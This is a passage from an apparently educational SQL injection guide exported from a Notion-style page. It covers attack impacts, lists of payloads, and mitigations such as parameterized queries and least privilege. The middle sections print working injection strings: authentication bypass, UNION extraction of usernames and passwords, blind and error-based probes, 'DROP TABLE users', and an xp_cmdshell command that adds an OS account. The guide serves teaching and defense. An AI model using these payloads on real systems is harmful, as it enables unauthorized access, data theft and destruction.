+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8036-8e01-f4802c41b777" class=""><strong>2. Authentication Bypass</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808e-86e6-c615003cc916" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c9-802d-f9103dde53b0" class="bulleted-list"><li style="list-style-type:disc">Login without credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8002-b55c-e99b892c2bd4" class="bulleted-list"><li style="list-style-type:disc">Access any user account</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8037-b79d-cdce416753da" class="bulleted-list"><li style="list-style-type:disc">Escalate privileges</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8040-ab2d-e036450ba495" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8090-8193-f4942f11d821" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Username: admin&#x27;--
+-- Password: (anything)
+SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27; AND password = &#x27;&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c8-8509-f2fbf574bc2c" class=""><strong>3. Data Manipulation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8066-b3a2-c0846633fabb" class=""><strong>Integrity Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d9-9907-dab536cec4d1" class="bulleted-list"><li style="list-style-type:disc">Modify user data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c3-a787-e014bc132076" class="bulleted-list"><li style="list-style-type:disc">Change prices</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a0-815a-e2c3ca247f3c" class="bulleted-list"><li style="list-style-type:disc">Alter records</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809f-bf02-f4e11a7759e3" class="bulleted-list"><li style="list-style-type:disc">Delete data</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8070-8ef3-c2af270c4cdc" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8035-b48f-c2a38695f63e" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27;; UPDATE users SET role = &#x27;admin&#x27; WHERE username = &#x27;attacker&#x27;--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805e-80d6-dbeda2a69e18" class=""><strong>4. Data Deletion</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c8-a846-c8d1209e26c4" class=""><strong>Availability Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ed-b7cb-d2419c6e64d8" class="bulleted-list"><li style="list-style-type:disc">Delete entire tables</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8069-830a-fe2d7d06a8d1" class="bulleted-list"><li style="list-style-type:disc">Drop databases</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8098-a030-d2c224e5c425" class="bulleted-list"><li style="list-style-type:disc">Truncate data</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80bf-bce9-f7ec4506ee8a" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b6-ac18-c05fb0aa9bf3" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27;; DROP TABLE users--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-808e-83d1-ef7d11a0998f" class=""><strong>5. Remote Code Execution</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e9-a960-ea5f0a1b6363" class=""><strong>Severity: Critical</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809e-aa41-e2f06d69052b" class="bulleted-list"><li style="list-style-type:disc">Execute OS commands</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8088-9119-d9ab33f1ee40" class="bulleted-list"><li style="list-style-type:disc">Access file system</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f7-8688-ef22a9d0fe05" class="bulleted-list"><li style="list-style-type:disc">Install backdoors</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d2-a2a7-d0605293c397" class="bulleted-list"><li style="list-style-type:disc">Pivot to other systems</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e4-8b85-e7e2476bc908" class=""><strong>Example (MSSQL):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80db-89fb-e7492d0c9776" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27;; EXEC xp_cmdshell(&#x27;net user hacker P@ssw0rd /add&#x27;)--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8064-beac-e5b3f4698671" class=""><strong>6. Server Compromise</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8081-895a-cad1e3afaae9" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bf-b61d-c91e346167fa" class="bulleted-list"><li style="list-style-type:disc">Complete system control</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c4-8c7f-d6f35165b396" class="bulleted-list"><li style="list-style-type:disc">Access internal network</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d8-a2ca-c7adbab3ee1e" class="bulleted-list"><li style="list-style-type:disc">Install persistent access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8086-8293-c3edb2839639" class="bulleted-list"><li style="list-style-type:disc">Use as attack platform</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8096-b5a6-c7eae8071d20"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8068-bf7f-cb10b83bdfec" class=""><strong>Common Attack Techniques</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80bf-8737-cbd1c5241fc8" class=""><strong>1. Authentication Bypass</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d4-9ef2-c9fb4b28eb66" class=""><strong>Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80aa-909a-ea7020e6016a" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27; OR &#x27;1&#x27;=&#x27;1
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;/*
+admin&#x27;--
+&#x27; OR 1=1--
+&#x27; OR 1=1#
+&#x27; OR 1=1/*
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8060-81dc-d5ddbb2bb2d9" class=""><strong>2. Union-Based Data Extraction</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803f-a8b5-e05f286f8264" class=""><strong>Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8016-b9b5-c7f60e9b9235" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27; UNION SELECT NULL--
+&#x27; UNION SELECT NULL, NULL--
+&#x27; UNION SELECT username, password FROM users--
+&#x27; UNION SELECT 1,2,3,4,5--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8049-98de-fd9767fddd8b" class=""><strong>3. Boolean-Based Blind</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8068-8353-fa4278724abc" class=""><strong>Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8044-995e-e9284b19c117" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27; AND 1=1--
+&#x27; AND 1=2--
+&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=&#x27;a&#x27;--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-808e-941c-e80f9eca6808" class=""><strong>4. Time-Based Blind</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d5-aaac-e9e873a7ee5d" class=""><strong>Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80dc-b301-da72f6a8dd70" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27;; WAITFOR DELAY &#x27;00:00:05&#x27;--
+&#x27;; SELECT SLEEP(5)--
+&#x27;; pg_sleep(5)--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-802a-b7ab-ea3108d3111d" class=""><strong>5. Error-Based</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a3-90a9-ea0a4f70a13f" class=""><strong>Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80c7-a321-f2ff7486423c" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27; AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80fd-9ebc-d96dcf92accc" class=""><strong>6. Second-Order</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8023-b911-c8e4f893cd22" class=""><strong>Payload:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-803c-acad-e9decb4c4e95" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Stored in database
+admin&#x27;--
+
+-- Executed later
+SELECT * FROM users WHERE username = &#x27;admin&#x27;--&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80d6-b5c7-d8140f46ffe9"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-802a-ae00-e3499454237a" class=""><strong>Mitigation Strategies</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8070-8d10-f4df03029548" class=""><strong>1. Parameterized Queries (Prepared Statements)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8019-a2de-df26dacdcd00" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8002-9784-df3da1b4121d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Python (using parameterized queries)
+query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;
+cursor.execute(query, (username, password))
+</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804d-af7a-edc6300861fd" class="code code-wrap"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">// Java (using PreparedStatement)
+String query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();
+</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8068-93b9-f6942fb0696f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Node.js (using parameterized queries)
+const query = &#x27;SELECT * FROM users WHERE username = ? AND password = ?&#x27;;
+db.query(query, [username, password], (err, results) =&gt; {
+  // Handle results
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-801e-8e46-e59c17659793" class=""><strong>2. Input Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cc-a3b8-fdd05297d0af" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d8-85aa-d33f446d310b" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import re
+
+def validate_username(username):
+    # Whitelist approach
+    if not re.match(r&#x27;^[a-zA-Z0-9_]{3,20}$&#x27;, username):
+        raise ValueError(&quot;Invalid username&quot;)
+    return username
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8000-a5df-e6a7d649ea29" class=""><strong>3. Least Privilege</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806c-aa89-fd3a9e909e9d" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8063-acce-e95ec24497b0" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Database user with minimal privileges
+CREATE USER &#x27;app_user&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;;
+GRANT SELECT, INSERT, UPDATE ON app_db.users TO &#x27;app_user&#x27;@&#x27;localhost&#x27;;
+-- No DROP, ALTER, or EXECUTE privileges
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80b0-bb72-d3b332812a0e" class=""><strong>4. Output Encoding</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c3-a68b-c20a09461489" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80e7-9103-d97229ee2c74" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Encode output to prevent XSS (secondary protection)
+from html import escape
+
+user_input = escape(user_input)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805f-9df4-f325bf53c0f8" class=""><strong>5. WAF (Web Application Firewall)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8030-a5e2-d18d2e61a9ed" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d5-956e-ff884261f113" class="bulleted-list"><li style="list-style-type:disc">Deploy WAF as additional layer</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8024-b7aa-cc099edefaa9" class="bulleted-list"><li style="list-style-type:disc">Configure SQL injection rules</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ed-9f69-ca65b809bd65" class="bulleted-list"><li style="list-style-type:disc">Monitor and alert on attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8076-a9b3-c0798c935a00" class="bulleted-list"><li style="list-style-type:disc"><strong>Note:</strong> WAF is not a substitute for secure coding</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807b-8a2d-e8e6ff3e1add"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80c3-a02c-cf92d5931da5" class=""><strong>Best Practices</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-801e-8a32-e4dd36517937" class=""><strong>1. Always Use Parameterized Queries</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d5-87ba-e88fc6ff74f3" class=""><strong>Rule:</strong> Never concatenate user input into SQL queries.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8020-8108-cdc3061f9fb3" class=""><strong>❌ WRONG:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80e8-b812-d6c00ab68431" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">query = f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8052-beeb-cfefa991ac09" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8097-bc07-de6eff675dd4" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">query = &quot;SELECT * FROM users WHERE username = ?&quot;
+cursor.execute(query, (username,))
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8020-aa3e-dbb0fc5a83d9" class=""><strong>2. Validate Input</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809e-83a6-c7b03d82aca0" class=""><strong>Rule:</strong> Validate all user input before using it.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8018-95a7-d09cfe40c8c6" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80cf-967d-d79be815aa2d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">def validate_input(input_value, input_type):
+    if input_type == &#x27;username&#x27;:
+        if not re.match(r&#x27;^[a-zA-Z0-9_]{3,20}$&#x27;, input_value):
+            raise ValueError(&quot;Invalid username&quot;)
